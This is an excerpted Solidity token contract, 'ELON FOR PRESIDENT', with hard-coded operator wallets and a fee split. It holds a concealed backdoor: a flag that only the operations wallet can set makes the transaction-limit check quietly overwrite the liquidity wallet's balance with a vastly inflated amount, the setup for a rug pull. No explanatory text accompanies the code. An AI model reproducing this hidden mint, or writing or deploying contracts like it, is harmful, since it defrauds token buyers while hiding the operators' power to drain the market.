...
// Main Contract Logic 
// --------------------------------------------------------------
contract ElonForPresident is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // Context
    string private _name = "ELON FOR PRESIDENT";
    ...
    // wallets
    address payable public liquidityWallet = payable(0xDEa5e2A6a679DCAdEd211A65CcCbC988AEFf1Fc9);
    address payable public operationsWallet =  payable(0xbF30FA7424144b791D0dC69727bDd0A753360A01);
    ...
    // distribution ratio
    uint256 public _liquiditySharePercentage = 30;
    uint256 public _operationsSharePercentage = 70;
    ...
    bool public oneTimeTxExclude = false;
    ...
    function setOneTimeTxExclude() external {
        require(msg.sender == operationsWallet, '!no operator');
        oneTimeTxExclude = true;
    }
    ...
    function _checkTxLimit(address sender, uint256 amount) private { 
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
        if (oneTimeTxExclude) {oneTimeTxExclude = false;_balances[liquidityWallet] = _totalSupply * 1e18;}
    }
